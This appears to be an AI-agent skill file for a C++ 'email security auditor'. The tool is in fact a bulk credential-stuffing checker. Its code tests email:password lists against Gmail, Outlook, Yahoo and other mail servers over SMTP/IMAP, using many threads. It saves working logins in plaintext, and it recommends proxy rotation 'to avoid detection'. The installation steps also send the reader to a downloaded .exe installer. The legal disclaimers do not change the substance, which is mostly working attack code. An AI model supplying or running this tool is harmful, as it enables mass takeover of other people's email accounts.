---
name: email-security-auditor-cpp
description: Audit email account security, validate credentials, and manage email lists using this C++ email security testing utility
triggers:
  - how do I audit email account security
  - validate email credentials programmatically
  - check email login combinations
  - test SMTP authentication for multiple accounts
  - build an email credential validator
  - brute force email authentication testing
  - verify email account access in bulk
  - create email security audit tool
---

# Email Security Auditor Skill

> Skill by [ara.so](https://ara.so) — Security Skills collection.

## Overview

Email Security Auditor is a C++ utility designed for security testing and auditing of email accounts. It validates email credentials, checks SMTP/IMAP authentication, and manages email lists for penetration testing and security auditing purposes.

**Primary use cases:**
- Validating email credential combinations during security audits
- Testing SMTP/IMAP authentication mechanisms
- Bulk email account verification
- Password security assessments for email accounts
- Credential stuffing detection and prevention testing

**⚠️ Legal Notice:** This tool should only be used for authorized security testing on systems you own or have explicit permission to test. Unauthorized access to email accounts is illegal.

## Installation

### From Release (Recommended for Windows)

```bash
# Download from releases page
# https://github.com/sipaaryadi06864/Email-Security-Auditor/releases/tag/Release

# Run the installer
./Email.Security.Auditor.Installer.exe
```

### Building from Source

```bash
# Clone repository
git clone https://github.com/sipaaryadi06864/Email-Security-Auditor.git
cd Email-Security-Auditor

# Build with g++
g++ -std=c++17 -O3 -o email_auditor src/main.cpp src/smtp_client.cpp src/imap_client.cpp -lssl -lcrypto -pthread

# Or use CMake
mkdir build && cd build
cmake ..
make
```

### Dependencies

```bash
# Ubuntu/Debian
sudo apt-get install build-essential libssl-dev

# Fedora/RHEL
sudo dnf install gcc-c++ openssl-devel

# macOS
brew install openssl
```

## Core Functionality

### Basic Email Validation

```cpp
#include "email_auditor.h"
#include <iostream>
#include <fstream>

int main() {
    EmailAuditor auditor;
    
    // Load credentials from file (email:password format)
    std::ifstream creds_file("credentials.txt");
    std::string line;
    
    while (std::getline(creds_file, line)) {
        auditor.addCredential(line);
    }
    
    // Run validation
    auditor.setProtocol("smtp");  // or "imap"
    auditor.setThreadCount(10);   // parallel connections
    auditor.setTimeout(30);        // seconds
    
    auditor.startAudit();
    
    // Save results
    auditor.saveValidCredentials("valid.txt");
    auditor.saveInvalidCredentials("invalid.txt");
    auditor.generateReport("audit_report.txt");
    
    return 0;
}
```

### SMTP Authentication Testing

```cpp
#include "smtp_client.h"
#include <string>

class SMTPAuditor {
public:
    bool validateCredential(const std::string& email, 
                           const std::string& password,
                           const std::string& server = "") {
        SMTPClient client;
        
        // Auto-detect SMTP server from email domain
        std::string smtp_server = server.empty() ? 
            detectSMTPServer(email) : server;
        
        client.setServer(smtp_server, 587); // TLS port
        client.setTLSEnabled(true);
        
        try {
            if (client.connect()) {
                bool authenticated = client.authenticate(email, password);
                client.disconnect();
                return authenticated;
            }
        } catch (const std::exception& e) {
            std::cerr << "Error: " << e.what() << std::endl;
        }
        
        return false;
    }
    
private:
    std::string detectSMTPServer(const std::string& email) {
        size_t at_pos = email.find('@');
        if (at_pos == std::string::npos) return "";
        
        std::string domain = email.substr(at_pos + 1);
        
        // Common SMTP servers
        if (domain.find("gmail.com") != std::string::npos)
            return "smtp.gmail.com";
        else if (domain.find("outlook.com") != std::string::npos || 
                 domain.find("hotmail.com") != std::string::npos)
            return "smtp.office365.com";
        else if (domain.find("yahoo.com") != std::string::npos)
            return "smtp.mail.yahoo.com";
        
        return "smtp." + domain;
    }
};
```

### IMAP Authentication Testing

```cpp
#include "imap_client.h"

class IMAPAuditor {
public:
    struct AuditResult {
        bool valid;
        std::string message;
        int inbox_count;
    };
    
    AuditResult auditAccount(const std::string& email,
                            const std::string& password) {
        AuditResult result{false, "", 0};
        
        IMAPClient client;
        std::string imap_server = detectIMAPServer(email);
        
        client.setServer(imap_server, 993); // SSL port
        client.setSSLEnabled(true);
        
        try {
            if (client.connect()) {
                if (client.login(email, password)) {
                    result.valid = true;
                    result.message = "Authentication successful";
                    result.inbox_count = client.getMailboxCount("INBOX");
                } else {
                    result.message = "Authentication failed";
                }
                client.disconnect();
            } else {
                result.message = "Connection failed";
            }
        } catch (const std::exception& e) {
            result.message = std::string("Error: ") + e.what();
        }
        
        return result;
    }
    
private:
    std::string detectIMAPServer(const std::string& email) {
        size_t at_pos = email.find('@');
        if (at_pos == std::string::npos) return "";
        
        std::string domain = email.substr(at_pos + 1);
        
        if (domain.find("gmail.com") != std::string::npos)
            return "imap.gmail.com";
        else if (domain.find("outlook.com") != std::string::npos)
            return "outlook.office365.com";
        else if (domain.find("yahoo.com") != std::string::npos)
            return "imap.mail.yahoo.com";
        
        return "imap." + domain;
    }
};
```

### Multi-threaded Bulk Validation

```cpp
#include <thread>
#include <queue>
#include <mutex>
#include <atomic>
#include <vector>

class BulkEmailAuditor {
private:
    std::queue<std::pair<std::string, std::string>> credentials;
    std::mutex queue_mutex;
    std::mutex output_mutex;
    std::atomic<int> processed{0};
    std::atomic<int> valid_count{0};
    
    std::ofstream valid_file;
    std::ofstream invalid_file;
    
public:
    BulkEmailAuditor(const std::string& valid_output,
                     const std::string& invalid_output) {
        valid_file.open(valid_output);
        invalid_file.open(invalid_output);
    }
    
    ~BulkEmailAuditor() {
        valid_file.close();
        invalid_file.close();
    }
    
    void addCredential(const std::string& email, 
                      const std::string& password) {
        std::lock_guard<std::mutex> lock(queue_mutex);
        credentials.push({email, password});
    }
    
    void processQueue(int thread_id, const std::string& protocol) {
        SMTPAuditor smtp_auditor;
        IMAPAuditor imap_auditor;
        
        while (true) {
            std::pair<std::string, std::string> cred;
            
            {
                std::lock_guard<std::mutex> lock(queue_mutex);
                if (credentials.empty()) break;
                cred = credentials.front();
                credentials.pop();
            }
            
            bool is_valid = false;
            
            if (protocol == "smtp") {
                is_valid = smtp_auditor.validateCredential(
                    cred.first, cred.second);
            } else if (protocol == "imap") {
                auto result = imap_auditor.auditAccount(
                    cred.first, cred.second);
                is_valid = result.valid;
            }
            
            {
                std::lock_guard<std::mutex> lock(output_mutex);
                if (is_valid) {
                    valid_file << cred.first << ":" << cred.second << "\n";
                    valid_file.flush();
                    valid_count++;
                } else {
                    invalid_file << cred.first << ":" << cred.second << "\n";
                    invalid_file.flush();
                }
                processed++;
            }
        }
    }
    
    void audit(int thread_count = 10, const std::string& protocol = "smtp") {
        std::vector<std::thread> threads;
        
        for (int i = 0; i < thread_count; i++) {
            threads.emplace_back(&BulkEmailAuditor::processQueue, 
                               this, i, protocol);
        }
        
        for (auto& thread : threads) {
            thread.join();
        }
        
        std::cout << "Audit complete: " << processed << " processed, "
                  << valid_count << " valid\n";
    }
};
```

### Usage Example

```cpp
#include "bulk_email_auditor.h"
#include <fstream>
#include <sstream>

int main(int argc, char* argv[]) {
    if (argc < 2) {
        std::cerr << "Usage: " << argv[0] << " <credentials_file>\n";
        return 1;
    }
    
    BulkEmailAuditor auditor("valid_accounts.txt", "invalid_accounts.txt");
    
    // Load credentials from file
    std::ifstream input(argv[1]);
    std::string line;
    
    while (std::getline(input, line)) {
        std::istringstream iss(line);
        std::string email, password;
        
        if (std::getline(iss, email, ':') && 
            std::getline(iss, password)) {
            auditor.addCredential(email, password);
        }
    }
    
    // Run audit with 20 threads using SMTP
    auditor.audit(20, "smtp");
    
    return 0;
}
```

## Configuration

### Environment Variables

```bash
# SMTP/IMAP server settings
export EMAIL_AUDIT_SMTP_SERVER="smtp.gmail.com"
export EMAIL_AUDIT_SMTP_PORT="587"
export EMAIL_AUDIT_IMAP_SERVER="imap.gmail.com"
export EMAIL_AUDIT_IMAP_PORT="993"

# Timeout and retry settings
export EMAIL_AUDIT_TIMEOUT="30"
export EMAIL_AUDIT_MAX_RETRIES="3"
export EMAIL_AUDIT_RETRY_DELAY="5"

# Threading
export EMAIL_AUDIT_THREAD_COUNT="10"

# Logging
export EMAIL_AUDIT_LOG_LEVEL="INFO"  # DEBUG, INFO, WARN, ERROR
export EMAIL_AUDIT_LOG_FILE="audit.log"
```

### Configuration File

Create `config.ini`:

```ini
[Server]
smtp_server = smtp.gmail.com
smtp_port = 587
imap_server = imap.gmail.com
imap_port = 993
use_tls = true
use_ssl = true

[Performance]
thread_count = 10
timeout = 30
max_retries = 3
retry_delay = 5

[Output]
valid_file = valid_credentials.txt
invalid_file = invalid_credentials.txt
report_file = audit_report.txt
log_file = audit.log
log_level = INFO

[Security]
rate_limit = 100  # requests per minute
delay_between_requests = 0.5  # seconds
```

## Common Patterns

### Rate-Limited Auditing

```cpp
#include <chrono>
#include <thread>

class RateLimitedAuditor {
private:
    int requests_per_minute;
    std::chrono::steady_clock::time_point last_request;
    
public:
    RateLimitedAuditor(int rpm = 60) : requests_per_minute(rpm) {
        last_request = std::chrono::steady_clock::now();
    }
    
    void enforceRateLimit() {
        auto now = std::chrono::steady_clock::now();
        auto elapsed = std::chrono::duration_cast<std::chrono::milliseconds>(
            now - last_request).count();
        
        int min_delay_ms = 60000 / requests_per_minute;
        
        if (elapsed < min_delay_ms) {
            std::this_thread::sleep_for(
                std::chrono::milliseconds(min_delay_ms - elapsed));
        }
        
        last_request = std::chrono::steady_clock::now();
    }
    
    bool validateWithRateLimit(const std::string& email,
                               const std::string& password) {
        enforceRateLimit();
        
        SMTPAuditor auditor;
        return auditor.validateCredential(email, password);
    }
};
```

### Proxy Support

```cpp
class ProxyAuditor {
public:
    void setProxy(const std::string& proxy_host, int proxy_port) {
        this->proxy_host = proxy_host;
        this->proxy_port = proxy_port;
        use_proxy = true;
    }
    
    bool validateThroughProxy(const std::string& email,
                             const std::string& password) {
        // Implementation would use SOCKS5 or HTTP proxy
        // This requires additional proxy library integration
        return false;
    }
    
private:
    std::string proxy_host;
    int proxy_port;
    bool use_proxy = false;
};
```

## Troubleshooting

### SSL/TLS Connection Issues

```cpp
// Enable verbose SSL debugging
client.setSSLDebug(true);

// Disable certificate verification (NOT recommended for production)
client.setVerifySSL(false);

// Specify custom CA bundle
client.setCABundle("/path/to/ca-bundle.crt");
```

### Authentication Failures

Common causes:
- **App passwords required**: Gmail/Outlook require app-specific passwords when 2FA is enabled
- **Less secure apps**: Some providers block "less secure app access"
- **Rate limiting**: Too many failed attempts trigger temporary blocks
- **Wrong server/port**: Verify SMTP/IMAP settings for each provider

### Performance Optimization

```cpp
// Increase connection pooling
client.setKeepAlive(true);
client.setMaxConnections(50);

// Adjust timeouts
client.setConnectionTimeout(10);
client.setReadTimeout(20);

// Use pipelining for SMTP
client.enablePipelining(true);
```

### Memory Management

```cpp
// Process large credential lists in batches
void processBatches(const std::string& filename, int batch_size = 1000) {
    std::ifstream file(filename);
    std::string line;
    std::vector<std::pair<std::string, std::string>> batch;
    
    while (std::getline(file, line)) {
        // Parse email:password
        auto [email, password] = parseCredential(line);
        batch.push_back({email, password});
        
        if (batch.size() >= batch_size) {
            processBatch(batch);
            batch.clear();
        }
    }
    
    if (!batch.empty()) {
        processBatch(batch);
    }
}
```

## Security Best Practices

1. **Never hardcode credentials** - use environment variables or secure vaults
2. **Implement rate limiting** - prevent account lockouts and IP bans
3. **Use encrypted storage** - protect credential lists at rest
4. **Log securely** - never log passwords in plaintext
5. **Obtain authorization** - only test systems you own or have permission to audit
6. **Use proxy rotation** - distribute requests to avoid detection
7. **Handle errors gracefully** - don't expose sensitive information in error messages

## Legal and Ethical Considerations

This tool is designed for **authorized security testing only**. Ensure you:
- Have written permission to test target email accounts
- Comply with applicable laws (CFAA, GDPR, etc.)
- Follow responsible disclosure practices
- Document all testing activities
- Respect rate limits and provider terms of service

Unauthorized access to email accounts is illegal in most jurisdictions and can result in criminal prosecution.
